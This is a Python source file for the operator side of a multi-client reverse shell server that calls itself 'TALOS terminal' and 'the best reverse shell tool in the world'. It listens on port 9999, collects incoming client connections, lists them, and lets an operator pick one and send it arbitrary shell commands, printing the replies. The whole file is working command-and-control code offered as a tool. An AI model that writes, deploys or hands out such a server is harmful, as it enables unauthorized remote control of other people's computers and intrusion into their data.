import socket
from threading import Thread
import time
from colorama import Fore, Style, Back


class Server:
    """
        main class for server
    """
    def __init__(self):
        self.all_connection = []
        self.all_addresses = []
        self.CONST_LEN = 14
        self.host = ''
        self.port = 9999
        self.serverSock = None

        self.handleThread()

    def set_format(self, data):
        i = str(len(data.encode()))
        if (int(i) > 9999):
            return "### special code ###"
        i = i.zfill(self.CONST_LEN)
        #print(len(str(i).encode()))
        return i + data

    def socket_create(self):
        try:
            self.serverSock = socket.socket()
        except socket.error as msg:
            print(Fore.RED + "Socket creation error: " + str(msg) + Fore.RESET)


    def socket_bind(self):
        try:
            print(Fore.BLUE + "\nBinding socket to port " + str(self.port) + '\n' + Fore.RESET)
            self.serverSock.bind((self.host, self.port))
            self.serverSock.listen(5)#up to five false connection
        except socket.error as msg:
            print(Fore.RED + "\nSocket binding error: " + str(msg) + "\n" + "Retrying" + Fore.RESET)
            time.sleep(5)
            self.socket_bind()


    def accept_connection(self):
        for c in self.all_connection:
            c.close()
        del self.all_connection[:]
        del self.all_addresses[:]

        while True:
            try:
                i = 0
                conn, address = self.serverSock.accept()
                conn.setblocking(1)# check
                self.all_connection.append(conn)
                self.all_addresses.append(address)
                print(Fore.GREEN + "\nConnection has been established to " + str(address) + Fore.RESET)
            except:
                print(Fore.RED + "Error accepting connections." + Fore.RESET)

    def start_master(self):
        while True:
            #self.all_connection = False
            cmd = input(Fore.RESET + "master@ ")
            if cmd == 'list':
                self.list_connections()#printting all connections, not created yet
            elif cmd == "help":
                self.printHelp()
            elif 'connect' in cmd:
                try:
                    (conn, addr_index) = self.get_target(cmd)#return the connection
                except:
                    continue
                if conn is not None:
                    self.send_target_commands(conn, addr_index)
            else:
                print(Fore.RED + "Command not recognized." + Fore.RESET)


    # Display all connection:
    def list_connections(self):
        result = ''
        #print(self.all_connection)
        for i, conn in enumerate(self.all_connection):
            try:
                conn.send(str.encode(self.set_format(' ')))
                len = int(conn.recv(self.CONST_LEN).decode())
                conn.recv(len)
            except:
                del self.all_connection[i]
                del self.all_addresses[i]
                continue
            result += str(i) + " : " + str(self.all_addresses[i]) +'\n'
        print(Fore.GREEN + " ---- Clients List ----- " + Fore.RESET)
        print(Fore.GREEN + result + Fore.RESET)
    #        result += str(i) + '  ' + str(all_connection[i][0]) + '  ' + str(all_connection[i][1]) +'\n'

    # Select a target client
    def get_target(self, cmd):
        try:
            target = cmd.replace('connect ', '')
            target = int(target)
            if(target < 0):
                print(Fore.RED + "Not a valid selection." + Fore.RESET)
                return None
            conn = self.all_connection[target]
            print(Fore.GREEN + "You are now connected to " + str(self.all_addresses[target]) + Fore.RESET) # [0]
            print(Fore.GREEN + "------------------------------------------" + Fore.RESET)
            return (conn, target)
        except:
            print(Fore.RED + "Not a valid selection." + Fore.RESET)
            return None

    # Ciinect wih remotes target client
    def send_target_commands(self, conn, target):
        while True:
            try:
                cmd = input("master@" + str(self.all_addresses[target]) + '$ ')
                if cmd == "quit":
                    print(Fore.GREEN + "You are now disconnecting from " + str(self.all_addresses[target]) + Fore.RESET)
                    print(Fore.GREEN + "-----------------------------------" + Fore.RESET)
                    return
                elif len(str.encode(cmd)) > 0:
                    conn.send(str.encode(self.set_format(cmd)))
                    responseLen = int(conn.recv(self.CONST_LEN).decode())
                    client_response = str(conn.recv(responseLen), "utf-8")
                    print(Fore.GREEN + client_response + Fore.RESET)#, end=""
            except:
                print(Fore.RED + " Connection was lost. " + Fore.RESET)
                break

    def threadFirstJob(self):
        self.socket_create()
        self.socket_bind()
        self.accept_connection()

    def threadSecandJob(self):
        self.start_master()

    def handleThread(self):
        print("crap")
        t1 = Thread(target=self.threadFirstJob)
        t1.deamon = True # die when main program exit
        t2 = Thread(target=self.threadSecandJob)
        t2.daemon = True

        t1.start() # Go
        print("123")
        time.sleep(0.5)

        t2.start()

    def printHelp(self):
        print(Style.BRIGHT + Back.BLUE + Fore.RED + "---- Welcome to TALOS terminal ----" + Back.RESET + Style.RESET_ALL)
        print(Fore.CYAN + "Here at TALOS we give you the best reverse shell tool in the world")
        print(Fore.RED + "Disclaimer: the entire terminal is space and case sensitive" + Fore.RESET)
        print(Fore.CYAN + "Quick Manual: commands")
        print("list: listing all available connection, by format[id : conn]")
        print("help: printing help info")
        print("quit: disconnecting from a client" + Fore.RESET + Style.RESET_ALL)
        #print(Back.GREEN + "\n" + Back.RESET)

def main():
    server = Server()

if __name__ == '__main__':
    main()
